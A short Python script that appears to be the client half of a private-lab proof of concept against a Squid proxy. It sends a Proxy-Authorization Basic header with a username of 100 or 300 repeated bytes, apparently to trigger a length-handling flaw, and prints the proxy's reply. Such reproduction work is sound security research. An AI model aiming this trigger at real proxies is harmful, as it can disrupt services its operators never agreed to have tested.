#!/usr/bin/env python3
"""Send one synthetic Basic-auth request to the private Squid lab."""

import base64
import socket
import sys


if len(sys.argv) != 2 or sys.argv[1] not in {"100", "300"}:
    raise SystemExit("usage: client.py <100|300>")
username = b"A" * int(sys.argv[1])
authorization = base64.b64encode(username + b":pw").decode("ascii")
request = (
    "GET http://peerstub/poc HTTP/1.1\r\n"
    "Host: peerstub\r\n"
    f"Proxy-Authorization: Basic {authorization}\r\n"
    "Connection: close\r\n\r\n"
).encode("ascii")

print(f"[client] username bytes: {len(username)}", flush=True)
print("[client] request: GET http://peerstub/poc HTTP/1.1", flush=True)
with socket.create_connection(("squid", 3128), timeout=10) as connection:
    connection.settimeout(10)
    connection.sendall(request)
    try:
        first_line = connection.recv(4096).split(b"\r\n", 1)[0]
    except (ConnectionResetError, socket.timeout):
        first_line = b""
print("[client] response: " + (first_line.decode("latin1") or "<no response>"))
